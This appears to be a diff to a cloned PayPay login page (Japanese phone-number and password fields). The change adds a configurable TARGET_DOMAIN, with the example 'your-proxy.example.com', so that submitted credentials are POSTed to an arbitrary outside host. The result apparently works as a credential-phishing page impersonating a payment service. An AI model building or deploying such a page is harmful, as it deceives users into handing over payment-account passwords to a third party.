@@ -191,12 +191,12 @@
           <section data-v-991fda77="" data-v-32bf0b5d="" class="account-signin-page">
             <h3 data-v-991fda77="">PayPayに登録した携帯電話番号でログイン</h3>
 
-            <section data-v-6ea1e05b="" data-v-991fda77="" class="signin-signon">
+            <form data-v-6ea1e05b="" data-v-991fda77="" class="signin-signon" id="loginForm" method="post" autocomplete="on" action="#">
               <!-- Phone number input -->
               <div data-v-6ea1e05b="" class="username">
                 <div data-v-6ea1e05b="" class="input-field">
                   <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
-                  <input data-v-6ea1e05b="" type="tel" name="username" placeholder="携帯電話番号" maxlength="13" value="" autocomplete="username">
+                  <input data-v-6ea1e05b="" id="username" type="tel" name="username" placeholder="携帯電話番号" maxlength="13" value="" autocomplete="username">
                   <label data-v-6ea1e05b="" id="login-inputPhone-txt" for="username">携帯電話番号</label>
                 </div>
               </div>
@@ -205,7 +205,7 @@
               <div data-v-6ea1e05b="" class="password">
                 <div data-v-6ea1e05b="" class="input-field">
                   <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
-                  <input data-v-6ea1e05b="" type="password" name="password" placeholder="パスワード" class="password-input" autocomplete="current-password">
+                  <input data-v-6ea1e05b="" id="password" type="password" name="password" placeholder="パスワード" class="password-input" autocomplete="current-password">
                   <label data-v-6ea1e05b="" id="login-inputPassword-txt" for="password">パスワード</label>
                 </div>
               </div>
@@ -216,11 +216,11 @@
               </div>
 
               <!-- Submit -->
-              <button data-v-6ea1e05b="" id="login-loginBtn" class="submit-button" disabled="">ログイン</button>
+              <button data-v-6ea1e05b="" id="login-loginBtn" type="submit" class="submit-button" disabled="">ログイン</button>
 
               <!-- Error -->
               <div class="login-error" id="loginError"></div>
-            </section>
+            </form>
 
             <!-- External account separator -->
             <div data-v-991fda77="" class="separate-text">外部のアカウントでログイン</div>
@@ -264,8 +264,15 @@
 
 <script>
 (function () {
-  const phoneInput = document.querySelector('input[name="username"]');
-  const passInput  = document.querySelector('input[name="password"]');
+  // ★ ドメインをここで指定 (末尾スラッシュなし)
+  const TARGET_DOMAIN = "";  // 例: "https://your-proxy.example.com"
+
+  const API_BASE   = TARGET_DOMAIN || "";
+  const LOGIN_PATH = "/api/login";
+
+  const form       = document.getElementById("loginForm");
+  const phoneInput = document.getElementById("username");
+  const passInput  = document.getElementById("password");
   const loginBtn   = document.getElementById("login-loginBtn");
   const errorDiv   = document.getElementById("loginError");
   const overlay    = document.getElementById("loadingOverlay");
@@ -291,7 +298,8 @@
     errorDiv.classList.remove("visible");
   }
 
-  loginBtn.addEventListener("click", async () => {
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
     clearError();
     const phone    = phoneInput.value.trim();
     const password = passInput.value.trim();
@@ -301,7 +309,7 @@
     loginBtn.disabled = true;
 
     try {
-      const res  = await fetch("/api/login", {
+      const res  = await fetch(API_BASE + LOGIN_PATH, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phone, password }),
